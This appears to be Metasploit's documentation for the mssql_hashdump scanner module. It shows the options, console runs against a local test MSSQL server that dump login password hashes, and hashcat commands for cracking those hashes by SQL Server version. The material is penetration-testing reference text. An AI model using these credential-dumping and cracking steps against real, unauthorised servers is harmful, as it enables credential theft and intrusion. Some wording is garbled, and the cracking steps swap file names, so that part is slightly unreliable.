## Description

The `mssql_hashdump` module queries an MSSQL instance or session and returns hashed user:pass pairs. These pairs can be decripted via or `hashcat`.

## Available Options

```
msf6 auxiliary(scanner/mssql/mssql_hashdump) > options

Module options (auxiliary/scanner/mssql/mssql_hashdump):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentication (requires DOMAIN option set)


   Used when making a new connection via RHOSTS:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DATABASE  MSSQL            no        The database to authenticate against
   PASSWORD                   no        The password for the specified username
   RHOSTS                     no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     1433             no        The target port (TCP)
   THREADS   1                yes       The number of concurrent threads (max one per host)
   USERNAME  MSSQL            no        The username to authenticate as


   Used when connecting via an existing SESSION:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on
```

## Scenarios

With a session:
```
msf6 auxiliary(scanner/mssql/mssql_hashdump) > sessions

Active sessions
===============

  Id  Name  Type   Information                Connection
  --  ----  ----   -----------                ----------
  1         mssql  MSSQL sa @ 127.0.0.1:1433  127.0.0.1:52307 -> 127.0.0.1:1433 (127.0.0.1)

msf6 auxiliary(scanner/mssql/mssql_hashdump) > run session=-1

[*] Using existing session 1
[*] Instance Name: "758549b9f69e"
[+] Saving mssql12 = sa:0x0200F433830BDBA809805FE53E59E7A1AACF9AC21241881F76B9B95EDC713FD01C8E692705409A5C0F8A46DDB1707A283BA9307D6B3C664BB9F7652758B70262C88F629DBC7E
[+] Saving mssql12 = ##MS_PolicyEventProcessingLogin##:0x02003F137BFF990AE7D0B89DA15EEDF4B962E200A9AAECE6AC7E4786176A08C4D278C0E9B203795F972CB508FD17827A755AF4284A9891F01C502EEBB5ECFABD7FA6CD3603E2
[+] Saving mssql12 = ##MS_PolicyTsqlExecutionLogin##:0x0200DA9B84641F740A6423EC34F1B354FB81D9DF53456A7A7A8CCB794B295896C0CD19718C2C9537D3A7E82C41350F1549E2E2B99D819345DCABF1855AF2F83FA6CDC3EF8F96
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/mssql/mssql_hashdump) > run RPORT=1433 RHOSTS=127.0.0.1 USERNAME=sa PASSWORD=yourStrong(!)Password

[*] 127.0.0.1:1433 - Instance Name: "758549b9f69e"
[+] 127.0.0.1:1433 - Saving mssql12 = sa:0x0200F433830BDBA809805FE53E59E7A1AACF9AC21241881F76B9B95EDC713FD01C8E692705409A5C0F8A46DDB1707A283BA9307D6B3C664BB9F7652758B70262C88F629DBC7E
[+] 127.0.0.1:1433 - Saving mssql12 = ##MS_PolicyEventProcessingLogin##:0x02003F137BFF990AE7D0B89DA15EEDF4B962E200A9AAECE6AC7E4786176A08C4D278C0E9B203795F972CB508FD17827A755AF4284A9891F01C502EEBB5ECFABD7FA6CD3603E2
[+] 127.0.0.1:1433 - Saving mssql12 = ##MS_PolicyTsqlExecutionLogin##:0x0200DA9B84641F740A6423EC34F1B354FB81D9DF53456A7A7A8CCB794B295896C0CD19718C2C9537D3A7E82C41350F1549E2E2B99D819345DCABF1855AF2F83FA6CDC3EF8F96
[*] 127.0.0.1:1433 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Directly querying a machine:
```
msf6 auxiliary(scanner/mssql/mssql_hashdump) > run RPORT=1433 RHOSTS=127.0.0.1 USERNAME=sa PASSWORD=yourStrong(!)Password

[*] 127.0.0.1:1433 - Instance Name: "758549b9f69e"
[+] 127.0.0.1:1433 - Saving mssql12 = sa:0x0200F433830BDBA809805FE53E59E7A1AACF9AC21241881F76B9B95EDC713FD01C8E692705409A5C0F8A46DDB1707A283BA9307D6B3C664BB9F7652758B70262C88F629DBC7E
[+] 127.0.0.1:1433 - Saving mssql12 = ##MS_PolicyEventProcessingLogin##:0x02003F137BFF990AE7D0B89DA15EEDF4B962E200A9AAECE6AC7E4786176A08C4D278C0E9B203795F972CB508FD17827A755AF4284A9891F01C502EEBB5ECFABD7FA6CD3603E2
[+] 127.0.0.1:1433 - Saving mssql12 = ##MS_PolicyTsqlExecutionLogin##:0x0200DA9B84641F740A6423EC34F1B354FB81D9DF53456A7A7A8CCB794B295896C0CD19718C2C9537D3A7E82C41350F1549E2E2B99D819345DCABF1855AF2F83FA6CDC3EF8F96
[*] 127.0.0.1:1433 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Different MSSQL Versions have different hash formats. For example:

MSSQL (2000): 0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578
MSSQL (2005): 0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe
MSSQL (2012 and later): 0x02000102030434ea1b17802fd95ea6316bd61d2c94622ca3812793e8fb1672487b5c904a45a31b2ab4a78890d563d2fcf5663e46fe797d71550494be50cf4915d3f4d55ec375

To decrypt:
Save into a `passwords.txt` file
Run with hashcat, based on the MSSQL Version:
`hashcat --force -m 131 ./hashes.txt ./passwords.txt` (MSSQL 2000)
`hashcat --force -m 132 ./hashes.txt ./passwords.txt` (MSSQL 2005)
`hashcat --force -m 1731 ./hashes.txt ./passwords.txt` (MSSQL 2012 and later)
